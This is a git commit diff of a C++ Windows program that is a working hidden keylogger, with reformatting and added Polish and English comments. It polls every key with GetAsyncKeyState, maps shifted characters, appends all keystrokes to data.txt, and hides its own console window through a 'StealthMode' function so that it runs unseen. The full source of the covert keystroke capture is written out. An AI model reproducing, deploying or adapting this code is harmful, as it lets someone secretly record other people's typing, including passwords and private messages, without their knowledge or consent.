2900a6444558af2810979899ed197a693b13b05c
unknown <przemek.salek@amorki.pl>
2020-10-02 11:50:58 +0200

    small changes/descriptions

--- main.cpp
+++ main.cpp
@@ -5,103 +5,103 @@
 
 using namespace std;
 
-void StartLogging(){
+void StartLogging() {
     char c;
 
     while(true) {
-        for(c = 8; c <= 222; c++){
-            if(GetAsyncKeyState(c)==-32767) {
+        for(c = 8; c <= 256; c++){
+            if(GetAsyncKeyState(c) == -32767) {
 
-                ofstream write("data.txt", ios::app);
+                ofstream file("data.txt", ios::app);
 
-                if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10))) {
+                if((c>64 && c<91) && !GetAsyncKeyState(0x10)) {
                     c+=32;
-                    write<<c;
-                    write.close();
+                    file << c;
+                    file.close();
                     break;
-                } else if((c>64)&&(c<91)) {
-                    write<<c;
-                    write.close();
+                } else if(c>64 && c<91) {
+                    file << c;
+                    file.close();
                     break;
                 } else {
                     switch (c) {
                         case 48:
-                            if(GetAsyncKeyState(0x10))
-                                write<<")";
-                            else
-                                write<<"0";
+                            if(GetAsyncKeyState(0x10))                  //GetAsyncKeyState(0x10) - sprawdza czy SHIFT jest wciśnięty
+                                file << ")";                            				//zamiast if(GetAsyncKeyState(0x10))...else... można zrobić
+                            else                                        				//ogólny przypadek case VK_SHIFT (ale wtedy tekst jest mniej
+                                file << "0";                            				//czytelny)
                             break;
                         case 49:
-                            if(GetAsyncKeyState(0x10))
-                                write<<"!";
-                            else
-                                write<<"1";
+                            if(GetAsyncKeyState(0x10))                  //GetAsyncKeyState(0x10) - checks if the shift key is pressed
+                                file << "!";                            				//instead of if(GetAsyncKeyState(0x10))...else... you can do
+                            else                                        				//a general case VK_SHIFT (but the text becomes less readable)
+                                file << "1";
                             break;
                         case 50:
                             if(GetAsyncKeyState(0x10))
-                                write<<"@";
+                                file << "@";
                             else
-                                write<<"2";
+                                file << "2";
                             break;
                         case 51:
                             if(GetAsyncKeyState(0x10))
-                                write<<"#";
+                                file << "#";
                             else
-                                write<<"3";
+                                file << "3";
                             break;
                         case 52:
                             if(GetAsyncKeyState(0x10))
-                                write<<"$";
+                                file << "$";
                             else
-                                write<<"4";
+                                file << "4";
                             break;
                         case 53:
                             if(GetAsyncKeyState(0x10))
-                                write<<"%";
+                                file << "%";
                             else
-                                write<<"5";
+                                file << "5";
                             break;
                         case 54:
                             if(GetAsyncKeyState(0x10))
-                                write<<"^";
+                                file << "^";
                             else
-                                write<<"6";
+                                file << "6";
                             break;
                         case 55:
                             if(GetAsyncKeyState(0x10))
-                                write<<"&";
+                                file << "&";
                             else
-                                write<<"7";
+                                file << "7";
                             break;
                         case 56:
                             if(GetAsyncKeyState(0x10))
-                                write<<"*";
+                                file << "*";
                             else
-                                write<<"8";
+                                file << "8";
                             break;
                         case 57:
                             if(GetAsyncKeyState(0x10))
-                                write<<"(";
+                                file << "(";
                             else
-                                write<<"9";
+                                file << "9";
                             break;
                         case VK_SPACE:
-                            write<<" ";
+                            file << " ";
                             break;
                         case VK_RETURN:
-                            write<<"\n";
+                            file << "\n";
                             break;
                         case VK_TAB:
-                            write<<"  ";
+                            file << "  ";
                             break;
-                       case VK_BACK:
-                            write<<"<BACKSPACE>";
+                        case VK_BACK:
+                            file << "<BACKSPACE>";
                             break;
                         case VK_DELETE:
-                            write<<"<DELETE>";
+                            file << "<DELETE>";
                             break;
                         default:
-                            write<<c;
+                            file << c;
                     }
                 }
             }
@@ -109,8 +109,8 @@ void StartLogging(){
     }
 }
 
-void StealthMode(){
-    HWND stealth;
+void StealthMode(){                                            	 				//STEALTHMODE - tworzy uchwyt okna i go ukrywa
+    HWND stealth;                                               					//   -||-     - creates a handle to a window and hides it
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", nullptr);
     ShowWindow(stealth,0);
@@ -119,6 +119,5 @@ void StealthMode(){
 int main(){
     StealthMode();
     StartLogging();
-
     return 0;
 }
